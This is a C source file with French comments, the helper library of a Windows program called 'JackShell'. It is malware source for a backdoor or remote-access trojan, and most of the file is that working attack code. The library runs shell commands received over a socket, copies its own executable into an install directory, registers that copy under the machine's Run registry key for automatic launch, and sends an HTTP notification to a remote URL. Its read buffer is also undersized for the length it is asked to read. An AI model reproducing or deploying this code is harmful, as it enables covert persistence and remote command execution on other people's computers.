/*####################################
jacklib.c
contient toutes les fonctions de la bibliothèque propre au programme.
####################################*/

#ifndef _JACKLIB_H_
  #include "jacklib.h"
#endif // _JACKLIB_H_

/*
    Get Console Window handle (merci MSDN :))
*/
HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024 // Buffer size for console window titles.
       HWND hwndFound;         // This is what is returned to the caller.
       char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
                                           // WindowTitle.
       char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
                                           // WindowTitle.
       // Fetch current window title.
       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       // Format a "unique" NewWindowTitle.
       wsprintf(pszNewWindowTitle,"%d/%d",
                   GetTickCount(),
                   GetCurrentProcessId());
       // Change current window title.
       SetConsoleTitle(pszNewWindowTitle);
       // Ensure window title has been updated.
       Sleep(40);
       // Look for NewWindowTitle.
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       // Restore original window title.
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}

/* 
    fonction system() un peu spéciale (POSIX)
    elle retourne l'exécution d'une commande dans le buffer pour etre envoyée à la socket...
    Elle est la base du shell du serveur.
*/
char *systM(char *buffer)
{
    int i, alloc;
    char request[ANS_SIZE];
    char *pbuff = (char *)malloc(ANS_SIZE);
    alloc = ANS_SIZE;
    while(pbuff == NULL) // en cas d'erreur d'allocation, on demande moins...
    {
        alloc -= 100;
        pbuff = (char *)malloc(alloc);
    }  
    char *cmd = buffer;
    memset(pbuff, 0, alloc);
	FILE *pp;
	pp = popen(cmd, "r");
    while (fgets(request, sizeof(request), pp))
    {
        strncat(pbuff, request, alloc-strlen(pbuff)-1);
    }
	pclose(pp);
	return pbuff;
}

/*
    Vérifie si le fichier existe, renvoit 1 si c'est le cas
*/
int fexist(const char *filename)
{
FILE *fichier = NULL;

fichier = fopen(filename, "rb");
if (fichier == NULL)
    return 0;
else
{
    fclose(fichier);
    return 1;
}
}

/*
    Ecriture dans la base de registre...
*/
void InsertRegRun(char *pszprog)
{
char szValue[] = REG_NAME;
HKEY hKey;

if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, REG_KEY, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hKey, 0))
    return;
if(pszprog)
    RegSetValueEx(hKey, szValue, 0, REG_SZ, (BYTE*)pszprog, strlen(pszprog));
else
    RegDeleteValue(hKey, szValue);
    
RegCloseKey(hKey);
return;
}

/*
    Installation du serveur, duplication...
*/
int install(char *name)
{
    int i, c;
    char path_file[128];
    DWORD dwDisposition;
    HKEY hKey;
    FILE *fin, *fout;
  
    // copie de l'exe actuel
    strcpy(path_file,INSTALL_DIR);
    strcat(path_file,SERVER_NAME);
    if(fexist(path_file)==1)
        remove(path_file);
    fin = fopen(name, "rb");
    fout = fopen(path_file, "wb");
    while((c=getc(fin)) != EOF)
        putc(c, fout);
    fclose(fin);
    fclose(fout);
    
    // écriture dans la BDR pour l'auto-launching
    InsertRegRun(path_file);
    
    return 0;
}

/*
    Fonction qui détecte une connexion internet, si c le cas elle renvoit 1
*/
int is_connected(void)
{
    DWORD dwFlags;
    if(InternetGetConnectedState(&dwFlags, (DWORD)NULL))
        return 1;
    else
        return 0;
}

/*
    Fonction de notification, elle envoit une requete HTTP à l'url
*/
int http_request(char *url)
{
    HINTERNET hINet, hFile;
    char buffer[128];
    DWORD dwRead;
    hINet = InternetOpen("JackShell_Notif", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hFile = InternetOpenUrl(hINet, url, NULL, 0, 0, 0);
    if(hFile)
    {
        while(InternetReadFile(hFile, buffer, 1023, &dwRead))
        {
            if(dwRead == 0)
                break;
            buffer[dwRead] = 0;
        }
        InternetCloseHandle(hFile);
    }
    InternetCloseHandle(hINet);
    return 0;
}

/*
    Traitement de chaine :
    Majuscule -> Minuscule
*/
char *StringLwr(char *s)
{ 
    char *p = s;
    while (*s) {
        if((*s >= 'A')&&(*s <= 'Z'))
           *s += 32;
        s++;
    }
    return p;
}

/*
    Traitement de chaine :
    Enleve un '\n' en fin de chaine
*/
char *cutstr(char *str)
{
    char *cstr = str;
    while(*str)
    {
        if(*str == '\n')
           *str = '\0';
        str++;
    }
    return cstr;
}
